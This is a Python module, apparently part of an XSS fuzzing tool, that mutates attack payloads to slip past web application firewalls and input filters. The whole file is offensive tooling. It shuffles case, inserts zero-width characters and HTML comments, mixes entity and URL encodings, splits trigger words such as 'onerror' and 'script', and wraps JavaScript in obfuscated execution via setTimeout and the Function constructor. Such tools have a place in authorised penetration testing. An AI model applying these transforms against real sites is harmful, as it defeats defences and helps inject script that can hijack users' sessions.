# SPDX-License-Identifier: MIT
# -*- coding: utf-8 -*-
"""
Evasion transforms for WAF/filters.
All code/comments in English. No line-continuation backslashes or unsafe escapes.
"""

from __future__ import annotations
import json
import random
import re
from typing import Iterable, List

# Zero-width characters often tolerated by parsers but ignored by many filters
ZERO_WIDTH = ["\u200b", "\u200c", "\u200d"]

# Words that commonly trigger filters; we will mutate them
KEYWORDS = [
    "script", "onerror", "onload", "onmouseover", "onfocus", "oninput",
    "onclick", "onmouseenter", "onmouseleave", "alert", "prompt", "confirm",
    "javascript", "srcdoc"
]

def case_shuffle(s: str, p: float = 0.45) -> str:
    """Randomly toggle case of letters (keeps digits/symbols)."""
    out = []
    for ch in s:
        if ch.isalpha() and random.random() < p:
            out.append(ch.upper() if ch.islower() else ch.lower())
        else:
            out.append(ch)
    return "".join(out)

def insert_zero_width(s: str, density: float = 0.20) -> str:
    """Insert zero-width chars between alphanumerics with given probability."""
    if not s:
        return s
    out = [s[0]]
    for i in range(1, len(s)):
        prev, cur = s[i - 1], s[i]
        if prev.isalnum() and cur.isalnum() and random.random() < density:
            out.append(random.choice(ZERO_WIDTH))
        out.append(cur)
    return "".join(out)

def html_comment_noise(s: str, every: int = 5) -> str:
    """
    Insert HTML comment markers as noise between chunks.
    Keeps semantics in many HTML parsing paths.
    """
    if not s:
        return s
    chunks = [s[i : i + every] for i in range(0, len(s), every)]
    return "<!--x-->" + "<!--x-->".join(chunks)

def html_entity_mangle(s: str) -> str:
    """Mix of named/decimal/hex entities for common meta-chars."""
    table = {
        "<": ["&lt;", "&#60;", "&#x3c;"],
        ">": ["&gt;", "&#62;", "&#x3e;"],
        '"': ["&quot;", "&#34;", "&#x22;"],
        "'": ["&#39;", "&#x27;"],
        "/": ["&#47;", "&#x2f;"],
        "=": ["&#61;", "&#x3d;"],
        "(": ["&#40;", "&#x28;"],
        ")": ["&#41;", "&#x29;"],
    }
    out = []
    for ch in s:
        if ch in table:
            out.append(random.choice(table[ch]))
        else:
            out.append(ch)
    return "".join(out)

def url_mangle(s: str) -> str:
    """
    Light percent-encoding for selected bytes while keeping punctuation recognizable.
    Avoids double-encoding. Safe for query/fragment contexts.
    """
    def _enc(c: str) -> str:
        o = ord(c)
        if c.isalnum() or c in "-._~":
            return c
        return "%%%02X" % o
    return "".join(_enc(c) for c in s)

def keyword_split(s: str) -> str:
    """
    Split hot keywords with benign separators that browsers often ignore.
    e.g., 'script' -> 'scr' + '/**/' + 'ipt', 'onerror' -> 'on' + '\\n' + 'error'
    """
    def _split_word(word: str) -> str:
        mid = max(1, len(word) // 2)
        seps = ["/**/", "<!--x-->", "\n", random.choice(ZERO_WIDTH)]
        return word[:mid] + random.choice(seps) + word[mid:]

    def repl(m: re.Match) -> str:
        w = m.group(0)
        mutated = _split_word(w.lower())
        out = []
        for i, ch in enumerate(mutated):
            if i < len(w) and w[i].isupper():
                out.append(ch.upper())
            else:
                out.append(ch)
        return "".join(out)

    rx = re.compile(r"(?i)(" + "|".join(re.escape(k) for k in KEYWORDS) + r")")
    return rx.sub(repl, s)

def _js_quote(s: str) -> str:
    """
    Produce a safe JS string literal using JSON encoding (double-quoted).
    Prevents backslash/quote issues in Python source.
    """
    return json.dumps(s)

def delayed_exec_wrappers(js: str) -> List[str]:
    """Wrap a JS snippet to delay/obfuscate execution (no unsafe Python escapes)."""
    js_q = _js_quote(js)
    return [
        f"setTimeout(function(){{{js}}},10)",
        f"Function('', {js_q})()",
        f"(()=>{{{js}}})()",
    ]

# ---------- public API expected by mutator.py ----------

def apply_all(payload: str) -> List[str]:
    """
    Generate a small set of polymorphic variants for a given payload.
    Order is stable but content is randomized.
    """
    variants = [
        payload,
        case_shuffle(payload),
        insert_zero_width(payload),
        html_comment_noise(payload),
        html_entity_mangle(payload),
        url_mangle(payload),
        keyword_split(payload),
    ]

    if re.search(r"[;(){}=]", payload):
        variants.extend(delayed_exec_wrappers(payload))

    # de-dup preserving order
    seen = set()
    uniq: List[str] = []
    for v in variants:
        if v not in seen:
            uniq.append(v)
            seen.add(v)
    return uniq

# Compatibility exports (some versions import these names)
def compose_evasions(js: str) -> List[str]:
    return delayed_exec_wrappers(js)

def mutate(payload: str) -> List[str]:
    return apply_all(payload)
